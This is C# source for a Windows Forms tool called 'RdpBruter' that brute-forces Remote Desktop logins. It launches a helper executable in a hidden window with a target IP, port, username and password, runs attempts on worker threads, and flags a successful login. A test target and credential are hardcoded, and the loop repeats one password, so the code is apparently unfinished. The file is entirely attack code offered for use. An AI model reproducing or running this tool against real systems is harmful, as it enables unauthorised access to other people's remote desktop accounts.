﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RdpBruter
{
    public class RdpInfo
    {
        public String ip;
        public String port;
        public String username;
        public String password;
    }
    public partial class Form_Main : Form
    {
        public Form_Main()
        {
            InitializeComponent();
        }

        String ip;
        Int32 maxThreadCount = 1;
        Int32 sleepTime = 0;
        Int32 flag;

        public delegate void ListViewAdResultdDelegate(String str,Color color);//定义输出结果的委托
        public void ListViewAddResult(String str, Color color)
        {
            if (!this.listView_Result.InvokeRequired)
            {
                ListViewItem addItem = new ListViewItem();
                addItem.Text = str;
                addItem.ForeColor = color;
                this.listView_Result.Items.Add(addItem);
            }    
            else
            {
                ListViewAdResultdDelegate listViewAdResultdDelegate = new ListViewAdResultdDelegate(this.ListViewAddResult);
                this.listView_Result.Invoke(listViewAdResultdDelegate, str, color);
            }
        }


        public Int32 RdpCheck(String ip, String port, String username, String password)
        {
            Process process = new Process();
            String fileName = "rdpthread.exe";
            String para = "rdp://" + ip + ":"+ port +" --user \"" + username + "\"  --pass \"" + password + "\"";
            System.Diagnostics.Debug.WriteLine(para);
            ProcessStartInfo processStartInfo = new ProcessStartInfo(fileName, para);
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo = processStartInfo;
            process.Start();

            process.WaitForExit(10000);
            if (!process.HasExited)
            {
                process.Kill();
                return 404;
            }
            int returnValue = process.ExitCode;
            
            return returnValue;
        }


        public void RdpCheckThread(object rdpInfo)
        {
            Int32 resultCode;
            RdpInfo curRdpInfo = (RdpInfo)rdpInfo;
            System.Diagnostics.Debug.WriteLine(curRdpInfo.password);
            resultCode = RdpCheck(curRdpInfo.ip, curRdpInfo.port, curRdpInfo.username, curRdpInfo.password);
            System.Diagnostics.Debug.WriteLine(resultCode);
            if (resultCode == 602)
            {
                ListViewAddResult(curRdpInfo.password + "  password error", Color.Black);
            }
            else if (resultCode == 604)
            {
                ListViewAddResult(curRdpInfo.password + " Success", Color.Green);
                flag = 1;
                
            }
            else if (resultCode == 0)
            {
                ListViewAddResult(curRdpInfo.password + "   connect error", Color.Blue);
            }
            else if (resultCode == 404)
            {
                ListViewAddResult("这个端口可能不是rdp端口" + curRdpInfo.password, Color.Red);
            }
            else
            {
                ListViewAddResult("请联系作者" + curRdpInfo.password, Color.Red);
            }

            
        }

        public List<Thread> list_th = new List<Thread>();
        
        public void clearThread()
        {
            for (int i = 0; i < list_th.Count; i++)
            {
                if (list_th.Count <= 0) break;
                Thread cth = list_th[i];

                if (cth.IsAlive == false)
                {
                    list_th.Remove(cth);
                }
                Thread.Sleep(this.sleepTime);
            }
        }
        public void initThread(RdpInfo rdpInfo)
        {
            while (true)
            {
                clearThread();
                if (list_th.Count < this.maxThreadCount)
                {
                    Thread th = null;
                    th = new Thread(new ParameterizedThreadStart(RdpCheckThread));
                    list_th.Add(th);
                    th.Start(rdpInfo);
                    break;
                }
            }
        }

        public void Start()
        {
            flag = 0;
            RdpInfo curRdpInfo = new RdpInfo();
            curRdpInfo.ip = "192.168.62.128";
            curRdpInfo.port = "3389";
            curRdpInfo.username = "administrator";
            curRdpInfo.password = "lufei@123";
            for (Int32 i = 0; i < 200; i++)
            {
                if (flag == 1)
                    break;
                RdpCheckThread(curRdpInfo);
            }
        }


        private void button_Start_Click(object sender, EventArgs e)
        {
            ip = textBox_Target.Text;
            Task t = new Task(Start);
            t.Start();
        }
    }
}
